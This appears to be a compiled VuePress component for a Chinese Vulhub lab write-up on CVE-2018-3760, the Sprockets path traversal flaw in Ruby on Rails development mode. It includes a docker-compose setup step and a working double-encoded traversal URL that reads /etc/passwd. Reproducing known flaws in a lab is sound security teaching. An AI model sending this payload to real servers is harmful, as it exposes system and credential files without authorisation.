import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as r,c as n,a as e,b as a,d as s,e as c}from"./app-58e4a7d6.js";const d={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。",-1),u=e("p",null,[a("Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用"),e("code",null,"%252e%252e/"),a("来跨越到根目录，读取或执行目标服务器上任意文件。")],-1),h=e("p",null,"参考链接：",-1),g={href:"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf",target:"_blank",rel:"noopener noreferrer"},_={href:"https://seclists.org/oss-sec/2018/q2/210",target:"_blank",rel:"noopener noreferrer"},f={href:"https://xz.aliyun.com/t/2542",target:"_blank",rel:"noopener noreferrer"},b=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动一个用Ruby On Rails脚手架生成的默认站点：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>访问<code>http://your-ip:3000</code>即可查看到欢迎页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281914644.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接访问<code>http://your-ip:3000/assets/file:%2f%2f/etc/passwd</code>，将会报错，因为文件<code>/etc/passwd</code>不在允许的目录中。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281914413.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们通过报错页面，可以获得允许的目录列表。随便选择其中一个目录，如<code>/usr/src/blog/app/assets/images</code>，然后使用<code>%252e%252e/</code>向上一层跳转，最后读取<code>/etc/passwd</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281915174.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function m(k,x){const t=i("ExternalLinkIcon");return r(),n("div",null,[l,p,u,h,e("ul",null,[e("li",null,[e("a",g,[a("https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf"),s(t)])]),e("li",null,[e("a",_,[a("https://seclists.org/oss-sec/2018/q2/210"),s(t)])]),e("li",null,[e("a",f,[a("https://xz.aliyun.com/t/2542"),s(t)])])]),b])}const R=o(d,[["render",m],["__file","Ruby On Rails 路径穿越漏洞 CVE-2018-3760.html.vue"]]);export{R as default};
